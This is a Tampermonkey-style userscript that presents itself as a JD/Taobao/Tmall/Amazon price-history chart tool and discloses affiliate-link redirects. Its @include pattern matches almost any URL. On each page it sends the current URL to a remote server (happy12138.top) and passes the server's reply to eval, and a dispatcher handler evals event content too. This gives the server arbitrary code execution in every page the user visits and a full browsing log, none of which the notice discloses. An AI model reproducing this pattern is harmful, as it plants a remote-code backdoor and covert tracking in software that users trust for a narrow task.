// ==UserScript==
// @name        JD_Tmall_Taobao_Amazon_Histroy_Price
// @name:zh-CN  京东/天猫/淘宝/美亚历史价格
// @namespace   https://github.com/gam2046/userscript
// @description Shown histroy price of jd.com / taobao.com / taobao.com / amazon.com & No ADs
// @description:zh-CN [无广告] 一目了然显示京东/天猫商城/淘宝集市/美国亚马逊历史价格。Chrome 64.+中测试通过，其他环境不保证可用。
// @include     /http(?:s|)://(?:item\.(?:jd|yiyaojd)\.(?:[^./]+)/\d+\.html|.+)/
// @include     /http(?:s|)://(?:detail|item)\.(?:taobao|tmall)\.(?:[^./]+)/item.htm/
// @updateURL   https://github.com/gam2046/userscript/raw/master/jd-histroy-price.user.js
// @require     https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.1/Chart.bundle.min.js
// @require     https://cdn.jsdelivr.net/npm/sweetalert2@8
// @supportURL  https://github.com/gam2046/userscript/issues/new
// @connect     pansy.pw
// @connect     gwdang.com
// @connect     happy12138.top
// @connect     huihui.cn
// @run-at      document-start
// @version     23
// @grant       GM_xmlhttpRequest
// @grant       GM_setValue
// @grant       GM_getValue
// @copyright   2018+, forDream <gan2046#gmail.com>
// @author      forDream
// ==/UserScript==
(() => {
    'use strict';
    const notification = [{
        name: 'privacy-v1',
        match: /(?:jd|yiyaojd|taobao|tmall|amazon)\.(?:com|cn|jp.co)/,
        title: ['Respect your choice', '尊重您的知情权与选择权'],
        type: 'question',
        message: [`<p align="left">First of all, thank you very much for your trust in choosing this plug-in. However, before you use it, there are some things that I think you need to know, and you should decide whether to continue using this plug-in.
        <br/>
        <br/>0. This script is free of charge and does not require you to pay any fees.
        <br/>1. This script currently supports the historical price inquiry of JD (jd.com), Taobao (taobao.com), TMall (tmall.com) and Amazon of the United States.
        <br/>2. The data source of this script comes from the third party of the network and self-built. The self-built data is updated every 24 hours when the data size is less than 15 million items. According to the current method, the historical price you see will first display the data from the third party. If and only if the third party data source is unavailable, you will be able to obtain the relevant data in a special period as much as possible through updating. (For example, China's June 18 and December 11)
        <br/>3. For the product information display of JD (jd.com), Taobao (taobao.com) and TMall (tmall.com), the script will automatically access Jingdong Alliance and Taobao Alliance. This means that when you shop in JD (jd.com), Taobao (taobao.com) and TMall (tmall.com), I may receive a certain percentage of commission (the specific percentage is decided unilaterally by JD (jd.com) and Taobao Tmall), which does not need to be paid by you and you will not pay more money. However, this may lead to a jump in the browser when you enter the product details page. I hope you can understand.
        <br/>4. Since there is an overhead related to the server (self-built price data source) and the script itself does not have any advertisement, the income that may be generated from the above article 3 will be used to pay for this expense.
        <br/>5. If you cannot accept the content of Article 3 above, you don't need to worry. Nothing has happened yet. You can <b>delete this script</b> now.
        <br/>6. If you continue to use this script, you will be deemed to accept all the above contents.</p>`,
            `<p align="left">首先十分感谢您的信任，选择了本插件。但是在您使用之前，有一些事情，我认为是您需要知道的，并且您应该据此作出决定，是否继续使用本插件。
        <br/>
        <br/>0、此脚本免费，不需要您支付任何费用；
        <br/>1、本脚本目前支持京东商城、淘宝集市、天猫商城、美国亚马逊的历史价格查询；
        <br/>2、本脚本数据源来源于网络第三方与自建，其中自建数据，当数据规模小于1500万件商品时，更新频率为每24小时进行一次更新。根据目前的方式，您看到的历史价格将会首先显示来自第三方的数据，当且仅当第三方数据源不可用时，会通过更新的方式使用自建数据，尽可能保障您在特殊时期仍能够获得相关数据；（例如中国的6·18、双十一）
        <br/>3、对于京东商城、淘宝集市、天猫商城的商品信息展示，脚本会自动接入京东联盟与淘宝联盟。这意味着，您在京东商城、淘宝集市、天猫商城购物时，我可能会获得您购物金额一定比例的佣金（具体比例由京东、淘宝天猫单方面决定），这部分佣金不需要您支付，您也不会因此多付出金钱。但是因此可能会导致您进入商品详情页时，浏览器会有一次跳转，希望您能够理解。
        <br/>4、由于服务器相关存在开销（自建价格数据源），且脚本本身没有任何广告，因此上述第三条可能产生的收入将用于支付此费用；
        <br/>5、如果您无法接受上述第三条的内容，您不需要担心，现在什么事情都还没有发生，您现在可以<b>删除此脚本</b>；
        <br/>6、如果您继续使用本脚本，则视为您接受上述所有内容；</p>`]
    }]
    class Utils {
        static timestampToDateObject(timestamp) {
            while (timestamp < 1000000000000) {
                timestamp *= 10;
            }
            return new Date(timestamp);
        }
        static timestampToDateString(timestamp) {
            var date = Utils.timestampToDateObject(timestamp);
            var Y = date.getFullYear() + '-';
            var M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-';
            var D = date.getDate();
            return Y + M + D;
        }
        static sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        static createLink(targetLink, noreferrer, click) {
            const link = document.createElement('a')
            link.href = targetLink
            if (noreferrer) link.rel = 'noreferrer noopener'
            if (click) link.click()
            return link
        }
        static eventHandler(event) {
            switch (event.type) {
            }
        }
        static historyPriceByBuildin() {
            // stub 若第三方数据源中断，可发布更新 进行立即切换
        }
    }

    class I18N {
        static getText(key) {
            const text = {
                historyPrice: ['历史价格', 'Historical price'],
                averagePrice: ['历史均价', 'Historical average price'],
                originPrice: ['虚标原价', 'False standard original price'],
                labelTime: ['时间', 'Time'],
                labelPrice: ['价格', 'Price'],
                alertLater: ['下次再说', 'Next time'],
                alertConfirm: ['确认，不再提示', 'I confirm']
            }

            const index = this.isChinese() ? 0 : 1

            return text[key][index]
        }
        static isChinese() {
            return navigator.language.indexOf('zh') == -1 ? false : true
        }
    }

    class StateDispatcher {
        constructor() {
            this.handler = {}
            this.events = []
            this.ready = false
            this.registerHandler('execute', (e) => { eval(e.event)(this) })
        }

        makeEverythingReady() {
            this.ready = true
            this.events.forEach(element => { this.onEventInvoke(element) })
            this.events = []
            return this
        }

        registerHandler(eventType, handler) {
            if (this.handler[eventType]) {
                this.handler[eventType].push(handler)
            } else {
                this.handler[eventType] = [handler]
            }

            return this
        }

        onEventInvoke(event) {
            if (!this.ready) {
                this.events.push(event)
                return
            }

            const handlers = this.handler[event.name]
            if (handlers) {
                handlers.forEach(element => {
                    element(event)
                });
            }

            return this
        }
    }
    class ChartHelper {
        constructor() {
            this.colors = {
                red: 'rgb(255, 99, 132)',
                orange: 'rgb(255, 159, 64)',
                yellow: 'rgb(255, 205, 86)',
                green: 'rgb(75, 192, 192)',
                blue: 'rgb(54, 162, 235)',
                purple: 'rgb(153, 102, 255)',
                grey: 'rgb(201, 203, 207)'
            }

            this.data = {
                labels: [],
                datasets: [
                    {
                        label: I18N.getText('historyPrice'),
                        fill: false,
                        steppedLine: false,
                        backgroundColor: this.colors.blue,
                        borderColor: this.colors.blue,
                        data: []
                    }, {
                        label: I18N.getText('averagePrice'),
                        steppedLine: false,
                        backgroundColor: this.colors.green,
                        borderColor: this.colors.green,
                        borderDash: [5, 5],
                        fill: false,
                        data: []
                    }, {
                        label: I18N.getText('originPrice'),
                        steppedLine: false,
                        backgroundColor: this.colors.red,
                        borderColor: this.colors.red,
                        fill: false,
                        data: []
                    }
                ]
            }
        }

        /**
         * 设置历史价格
         * historyName:
         *   String数组
         *   代表每个数据源的名称
         *
         * historyPrice:
         *   key-value 数组 暂时降维度
         *   每个元素代表一个数据源
         *   key 为时间戳
         *   value 为价格
         */
        set historyPrice(/*historyName,*/historyPrice) {
            // 清空历史数据
            this.data.datasets[0].data = []
            this.data.labels = []

            // historyPrice.forEach((value, key, map) => {
            // this.data.labels.push(Utils.timestampToDateString(key))
            // this.data.datasets[0].data.push(value)
            // });
            historyPrice.prices.forEach(item => {
                this.data.labels.push(Utils.timestampToDateString(item.timestamp))
                this.data.datasets[0].data.push(item.price)
            })
        }

        // /**
        //  * 设置历史均价
        //  */
        set averagePrice(datasource) {
            let day = 0
            let price = 0
            let lastPrice = -1
            let lastStamp = -1
            const ONE_DAY = 86400000
            const firstMap = {}
            const lastMap = {}
            // datasource.forEach((value, key, map) => {
            datasource.prices.forEach((item) => {
                const key = item.timestamp
                const value = item.price
                if (lastPrice < 0) {
                    lastStamp = key
                    lastPrice = value
                    firstMap.timestamp = key
                    firstMap.price = value
                } else {
                    price += (lastPrice * ((key - lastStamp) / ONE_DAY))
                    lastPrice = value
                    lastStamp = key
                    lastMap.timestamp = key
                    lastMap.price = value
                }
            })
            day = (lastMap.timestamp - firstMap.timestamp) / ONE_DAY
            price += (lastPrice * (new Date() * 1 - lastStamp) / ONE_DAY)

            const value = (price / day).toFixed(3)

            console.log('Day', day, 'price', price, 'agv', value)

            this.data.datasets[1].data = []
            this.data.datasets[1].data.push({
                x: this.data.labels[0],
                y: value
            })
            this.data.datasets[1].data.push({
                x: this.data.labels[this.data.labels.length - 1],
                y: value
            })
        }

        /**
         * 设置虚标原价
         */
        set originPrice(value) {
            this.data.datasets[2].data = []
            this.data.datasets[2].push({
                x: this.data.labels[0],
                y: value
            })
            this.data.datasets[2].push({
                x: this.data.labels[this.data.labels.length - 1],
                y: value
            })
        }
        /**
         * 绘制图表
         * @param element 准备绘制图表的DOM对象
         * @param title 图表标题
         */
        draw(element, title) {
            const context = element.getContext('2d')
            const chart = new Chart(context, {
                responsive: true,
                type: "line",
                data: this.data,
                options: {
                    title: {
                        display: true,
                        text: title
                    },
                    hover: {
                        mode: 'nearest',
                        intersect: true
                    },
                    scales: {
                        xAxes: [{
                            display: true,
                            scaleLabel: {
                                display: true,
                                labelString: I18N.getText('labelTime')
                            }
                        }],
                        yAxes: [{
                            display: true,
                            scaleLabel: {
                                display: true,
                                labelString: I18N.getText('labelPrice')
                            }
                        }]
                    }
                }
            })
        }
    }

    const sandboxie = false
    const siteUrl = sandboxie ?
        /* Mix Content */
        'http://local.dev.pansy.pw:9876' :
        'https://promotion.happy12138.top'
    const dispatcher = new StateDispatcher()

    const hostname = document.createElement('meta')
    hostname.content = siteUrl
    hostname.name = 'hostname'

    document.addEventListener('DOMContentLoaded', () => {
        document.head.appendChild(hostname)
        dispatcher.onEventInvoke({ 'name': 'idle', 'dispatcher': dispatcher })
        notification.forEach((value, index, array) => {
            if (value.match.exec(window.location.href) != null && true != GM_getValue(value.name, false)) {
                const inx = I18N.isChinese() ? 1 : 0
                Swal.fire({
                    title: value.title[inx],
                    html: value.message[inx],
                    type: value.type,
                    showConfirmButton: true,
                    showCancelButton: true,
                    confirmButtonText: I18N.getText('alertConfirm'),
                    cancelButtonText: I18N.getText('alertLater'),
                    allowOutsideClick: false,
                    allowEscapeKey: false
                }).then(result => {
                    if (result.value) {
                        GM_setValue(value.name, true)
                    }
                })
            }
        })
    })

    GM_xmlhttpRequest({
        url: `${siteUrl}/api/v3/script?v=20190928`,
        method: "GET",
        timeout: 10000,
        headers: {
            'Accept': 'application/json',
            'Referer': location.href,
            'X-Referer': location.href
        },
        onload: (details) => {
            const text = details.responseText
            const event = JSON.parse(text)
            eval(event.event)(dispatcher)
        }
    });
})()
